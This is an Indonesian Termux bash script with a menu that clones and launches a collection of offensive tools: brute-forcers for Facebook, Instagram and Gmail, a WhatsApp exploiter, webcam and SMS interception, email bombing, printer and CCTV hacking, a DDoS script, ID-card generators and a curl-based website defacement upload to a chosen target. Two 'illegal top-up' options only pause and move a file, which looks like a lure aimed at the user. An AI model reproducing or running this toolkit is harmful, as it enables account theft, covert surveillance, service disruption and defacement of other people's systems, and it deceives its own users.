clear
cat den.txt
echo "===================================" 
echo "Tools Termux Multi Fungsi" | lolcat
echo "Author : R4D3N" | lolcat
echo "Team : BHCT - ICT - C45" | lolcat
echo "Find Me On Fb : Raden Gozal" | lolcat
echo "==================================="
echo ""
echo "-----------------------------  -----------------------------      " | lolcat 
echo "[1] . Hack FB narget           [15] . Yahoo Cloning Terbaru   [29]"
echo "-----------------------------  -----------------------------    I  " | lolcat
echo "[2] . Hack IG narget           [16] . Profile Guard FB          N"
echo "-----------------------------  -----------------------------    S" | lolcat
echo "[3] . Hack GMAIL narget        [17] . Sadap Kamera Jarak Jauh   T" 
echo "-----------------------------  -----------------------------    A" | lolcat
echo "[4] . Whatsapp Exploiter       [18] . Sadap Pesan Jarak Jauh    L"
echo "-----------------------------  -----------------------------    L" | lolcat
echo "[5] . Top Up Ilegal ML         [19] . IP TRACKER (LACAK ORG)"
echo "-----------------------------  -----------------------------    B " | lolcat
echo "[6] . Top Up Ilegal Free Fire  [20] . Download Lagu dari YT     A"
echo "-----------------------------  -----------------------------    H " | lolcat
echo "[7] . Auto Follow IG           [21] . Terror Email Orang        A"
echo "-----------------------------  -----------------------------    N   " | lolcat
echo "[8] . Auto Like FB             [22] . Hack Printer"
echo "-----------------------------  -----------------------------    D " | lolcat
echo "[9] . Bot Komen FB             [23] . Auto Report FB            U"
echo "-----------------------------  -----------------------------    L" | lolcat
echo "[10] . Bot IG                  [24] . KK & KTP GENERATOR        U"
echo "-----------------------------  -----------------------------     " | lolcat
echo "[11] . Hack CCTV               [25] . DDOS BY Ha3MrX"
echo "-----------------------------  -----------------------------     " | lolcat
echo "[12] . Hack Pulsa              [26] . DEFACE BY R4D3N"
echo "-----------------------------  -----------------------------     " | lolcat
echo "[13] . NEW MBF                 [27] . Bikin SC DEFACE"
echo "-----------------------------  -----------------------------     " | lolcat
echo "[14] . SMS GRATIS              [28] . Install J4NC0K tools"
echo "-----------------------------  -----------------------------     " | lolcat
echo -e "╭─[PILIH NOMORNYA]" | lolcat
read -p "╰─root@./R4D3N~#" pil; | lolcat

case $pil in
 1) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/IqbalDev/fb-brute
	cd fb-brute
	python2 brute.py
		;;
 
 2) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/instashell
	cd instashell
	chmod +x install.sh
	sudo ./install.sh
	chmod +x instashell.sh
	service tor start
	sudo ./instashell.sh
		;;

 3) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/Ha3MrX/Gemail-Hack
	cd Gemail-Hack
	chmod +x gemailhack.py
	python gemailhack.py
		;;

 4) figlet R4D3N-TOOLS | lolcat
	 git clone https://github.com/thelinuxchoice/whatshack
	 cd whatshack/
	 bash whatshack.sh
	 ;;

 5)	figlet R4D3N-TOOLS | lolcat
	read -p "Yakin? Y/N : " he;
	sleep 30
	read -p "Bener? Y/N : " ga;
	echo "Cek Di File Manager Kalian....Tinggal Reedem Di Playstrore"
	termux-setup-storage
	mv pil.txt /sdcard
	;;

 6) figlet R4D3N-TOOLS | lolcat
	read -p "Yakin? Y/N : " he;
	sleep 30
	read -p "Bener? Y/N : " ga;
	echo "Cek Di File Manager Kalian....Tinggal Reedem Di Playstrore"
	termux-setup-storage
	mv pil2.txt /sdcard
	;;

 7) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/Senitopeng/instabot.git
	cd instabot
	pip2 install -r requirements.tx
	bash instabot
	;;

 8) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/Acil95/botlike
	cd botlike
	python2 botlike.py
	;;

 9) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/Senitopeng/Botkomena
	cd Botkomena
	python2 botkomena.py
	;;

 10) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/choicebot
	cd choicebot
	chmod +x choicebot.sh
	nano hashtags.txt
	./choicebot.sh
	;;

 11) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/kancotdiq/ipcs
	cd ipcs
    python2 scan.py
    ;;

 12) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/ICT154/hackpulsa
	cd hackpulsa
	php pulsa.php
	;;

 13) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/KANG-NEWBIE/s-mbf
	cd s-mbf
	python -m pip install -r req.txt
	python embf.py
	;;

 14) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/privx/sms
	cd sms
	php sms.php
	;;

 15) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/N74NK/Yclone.git
	cd Yclone
	pip2 install -r requirements.txt
    python2 yclone.py
    ;;

 16) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/GUNAWAN18ID/PROFIL-GUARD.git
 	cd PROFIL-GUARD
 	python2 guard.py
 	;;

 17) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/saycheese
	cd saycheese
	bash saycheese.sh
	;;

 18) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/mysms
	cd mysms
	bash mysms.sh
	;;

 19) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/locator
	cd locator
	bash locator.sh
	;;

 20) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/pytube
	cd pytube
	python2 pytube.py
	;;

 21) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/anonymouse
	cd anonymouse
	python2 anonymouse.py 
	;;

 22) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/thelinuxchoice/helloprinter
	cd helloprinter
	bash helloprinter.sh
	;;

 23) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/SIIL3NT/auto-report
	cd auto-report
	python2 auto-report.py 
	;;

 24) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/IndonesianSecurity/kkktp
	cd kkktp
	ls
	php kkktp.php
	;;

 25) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/Ha3MrX/DDos-Attack
	cd DDos-Attack
	chmod +x ddos-attack.py
	python ddos-attack.py
	;;

 26) figlet R4D3N-TOOLS | lolcat
	read -p "Masukan Target : " target;
	read -p "Masukan Sc Deface : " script;
	curl -T /storage/emulated/0/$script $target
	echo "[HASIL]>>>>> = $target/$script " | lolcat
	;;

 27) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/ICT154/SDC
	cd SDC
	python2 create.py 
	;;

 28) figlet R4D3N-TOOLS | lolcat
	git clone https://github.com/ICT154/J4NC0K
	cd J4NC0K
	sh J4NC0K.sh
	;;

 29) figlet INSTALL BAHAN | lolcat
 	pkg update 
 	pkg upgrade
 	apt upgrade
 	apt update
 	pkg install python2 
 	pkg install python
 	pkg install php
 	pkg install git
 	pkg install curl
 	pkg install pip
 	pip2 install requests
 	pip2 install lolcat
 	pip2 install mechanize
 	pkg install figlet
 	figlet DONE | lolcat
 	sh R4D3N.sh
 	;;
 *) echo "Pilihan mu TIDAK ADA / SALAH"
	echo "Pilih lagi yang bener"
	sh R4D3N.sh	
esac
done
done
